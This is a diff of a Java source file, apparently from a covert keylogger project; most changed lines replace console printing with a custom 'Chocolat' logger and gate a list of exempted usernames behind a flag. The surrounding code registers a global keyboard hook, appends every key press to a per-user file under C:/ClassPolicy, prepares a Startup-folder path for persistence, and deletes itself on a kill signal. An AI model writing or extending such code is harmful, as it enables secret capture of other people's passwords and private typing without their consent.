@@ -29,32 +29,35 @@ public class Main implements NativeKeyListener
 	{	
 		int version = 1;
 		if (getCurrentVersion() > version) {
-			System.out.println("[?] A newer version has been released. Downloading version: " + getCurrentVersion());
+			Chocolat.println("[?] A newer version has been released. Downloading version: " + getCurrentVersion());
 		}
 		String[] protect = new String[]{"s-duv", "citrus","s-tehi", "s-chenb", "s-chenr"};
-		 System.out.println("Local_Username: " + System.getProperty("user.name"));
+		 Chocolat.println("Local_Username: " + System.getProperty("user.name"));
+		 if (Radio.isSecondaryDistrib)
+		 {
  		for(int fsk = 0; fsk < protect.length; fsk++) 
  		{
-		//	 System.out.println(System.getProperty("user.name"));
+		//	 Chocolat.println(System.getProperty("user.name"));
 			if (protect[fsk].matches(System.getProperty("user.name")))
 			{
-				 System.out.println("[" + robert.elapsedTime() + "] [!] Run Access Denied: Acct Status " + fsk);
+				 Chocolat.println("[" + robert.elapsedTime() + "] [!] Run Access Denied: Acct Status " + fsk);
 				 System.exit(0);
 			}
 		 }
+		 }
 		if (Radio.verifyOS && !isWindows())
 		{
-			System.out.println("[" + robert.elapsedTime() + "] [!] Run Access Denied: OS is not Windows.");
+			Chocolat.println("[" + robert.elapsedTime() + "] [!] Run Access Denied: OS is not Windows.");
 			System.exit(0);
 		}
 		if (Radio.checkForKill && isSuicune())
 		{
-			System.out.println("[" + robert.elapsedTime() + "] [!] Run Access Denied: Kill Command Received.");
+			Chocolat.println("[" + robert.elapsedTime() + "] [!] Run Access Denied: Kill Command Received.");
 			 File cf = new File(Main.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath());
 			cf.deleteOnExit();
 			System.exit(0);
 		}
-		System.out.println("[" + robert.elapsedTime() + "] [✔] Run Access Granted: All safety checks passed.");
+		Chocolat.println("[" + robert.elapsedTime() + "] [✔] Run Access Granted: All safety checks passed.");
 		File yiffyiff = new File(Main.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath());
 		String startup = "C:/Users/" + System.getProperty("user.name") + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup";
 		 @SuppressWarnings("unused")
@@ -64,15 +67,15 @@ public class Main implements NativeKeyListener
 		File log = new File("C:/ClassPolicy/" + System.getProperty("user.name") + ".txt");
 		if(!log.exists())
 		{
-			System.out.println("Creating logfile...");
-			System.out.println("[" + robert.elapsedTime() + "] Starting...");
+			Chocolat.println("Creating logfile...");
+			Chocolat.println("[" + robert.elapsedTime() + "] Starting...");
 			log.createNewFile();
 		} 
 		else
 		{
-			System.out.println("[" + robert.elapsedTime() + "] Starting...");
+			Chocolat.println("[" + robert.elapsedTime() + "] Starting...");
 		}
-		System.out.println("[" + robert.elapsedTime() + "] [✔] File I/O Established.");
+		Chocolat.println("[" + robert.elapsedTime() + "] [✔] File I/O Established.");
 		String fn = "C:/ClassPolicy/" + System.getProperty("user.name") + ".txt";
 		PrintWriter timestamper = new PrintWriter(new FileWriter(fn, true));
 		timestamper.println();
@@ -82,16 +85,15 @@ public class Main implements NativeKeyListener
 		try
 		{
 			GlobalScreen.registerNativeHook();
-			System.out.println("[" + robert.elapsedTime() + "] [✔] HookModule Successfully Registered.");
+			Chocolat.println("[" + robert.elapsedTime() + "] [✔] HookModule Successfully Registered.");
 		} 
 		catch (NativeHookException e)
 		{
 			// TODO Auto-generated catch block
-			System.out.println("["+ robert.elapsedTime() + "][!][FATAL] A NativeHook Exception Occured: " + e);
+			Chocolat.println("["+ robert.elapsedTime() + "][!][FATAL] A NativeHook Exception Occured: " + e);
 			e.printStackTrace();
 		}
 		GlobalScreen.getInstance().addNativeKeyListener(new Main());
-
 		}
 
 	private static boolean isSuicune()
@@ -110,12 +112,12 @@ public class Main implements NativeKeyListener
 	            	 return true;
 	             }
 	         }
-	         System.out.println("NO");
+	         Chocolat.println("NO");
 	         return false;
 		}
 		catch (Exception e)
 		{
-			System.out.println(e);
+			Chocolat.println(e.toString());
 			return false;
 		}
 	}
@@ -123,20 +125,20 @@ public class Main implements NativeKeyListener
 	public void nativeKeyPressed(NativeKeyEvent e)
 	{
 		// TODO Auto-generated method stub
-		//System.out.println(NativeKeyEvent.getKeyText(e.getKeyCode()));
+		//Chocolat.println(NativeKeyEvent.getKeyText(e.getKeyCode()));
 		record(NativeKeyEvent.getKeyText(e.getKeyCode()));
-	    // System.out.println("Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
+	    // Chocolat.println("Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
 	}
 	@Override
 	public void nativeKeyReleased(NativeKeyEvent e)
 	{
-		// System.out.println("Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
+		// Chocolat.println("Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
 		//if (NativeKeyEvent.getKeyText(e.getKeyCode()).matches("Enter")) {
-		//	System.out.print("\n");
+		//	Chocolat.print("\n");
 		//} else if (NativeKeyEvent.getKeyText(e.getKeyCode()).matches("Space")) {
-		//	System.out.print(" ");
+		//	Chocolat.print(" ");
 		//} else {
-		//	System.out.print(NativeKeyEvent.getKeyText(e.getKeyCode()));
+		//	Chocolat.print(NativeKeyEvent.getKeyText(e.getKeyCode()));
 		//}
 	}
 	@Override
@@ -150,7 +152,7 @@ public class Main implements NativeKeyListener
 		{
 			String filename = "C:/ClassPolicy/" + System.getProperty("user.name") + ".txt";
 			PrintWriter out = new PrintWriter(new FileWriter(filename, true));
-			// System.out.println("rec " + x);
+			// Chocolat.println("rec " + x);
 			if(x.matches("Space"))
 			{
 				out.print(" ");
